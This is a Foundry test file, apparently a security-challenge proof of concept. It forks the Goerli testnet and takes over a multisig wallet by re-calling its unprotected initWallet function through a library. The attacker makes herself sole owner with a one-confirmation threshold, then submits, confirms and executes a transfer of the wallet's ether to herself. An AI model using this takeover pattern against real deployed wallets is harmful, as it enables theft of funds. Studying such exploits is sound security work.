// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.19;

import "../src/Wallet/Wallet.sol";
import "../src/Wallet/WalletLibrary.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract WalletTest is Test {
    address alice;
    address walletAddress = 0x19c80e4Ec00fAAA6Ca3B41B17B75f7b0F4D64CB7;
    address walletLibraryAddress = 0x43FF315d0003365fe1246344115A3142b9EBfe0b;

    function setUp() public {
        string memory RPC = vm.envString("GOERLI_RPC_URL");
        vm.createSelectFork(RPC, 7197929);
        alice = makeAddr("alice");
    }

    function testTakeOwnership() public {
        Wallet wallet = Wallet(payable(walletAddress));
        vm.deal(address(wallet), 1);
        vm.startPrank(alice);
        //I can init again
        address[] memory owners = new address[](1);
        owners[0] = alice;
        uint256 length = 0;
        while (true) {
            try wallet.owners(length) {
                length++;
            } catch {
                break;
            }
        }
        console.log(length);
        (bool success,) = address(wallet).call(abi.encodeWithSignature("initWallet(address[],uint256)", owners, 1));
        assertEq(success, true);
        assertEq(wallet.numConfirmationsRequired(), 1);
        assertEq(wallet.owners(length), alice);

        // I can execute tx
        (success,) =
            address(wallet).call(abi.encodeWithSignature("submitTransaction(address,uint256,bytes)", alice, 1, ""));
        assertEq(success, true);

        uint256 txIndex = 0;
        (success,) = address(wallet).call(abi.encodeWithSignature("confirmTransaction(uint256)", txIndex));
        assertEq(success, true);

        uint256 aliceBalanceBefore = alice.balance;
        (success,) = address(wallet).call(abi.encodeWithSignature("executeTransaction(uint256)", txIndex));
        assertEq(success, true);

        assertEq(aliceBalanceBefore + 1, alice.balance);

        vm.stopPrank();
    }
}
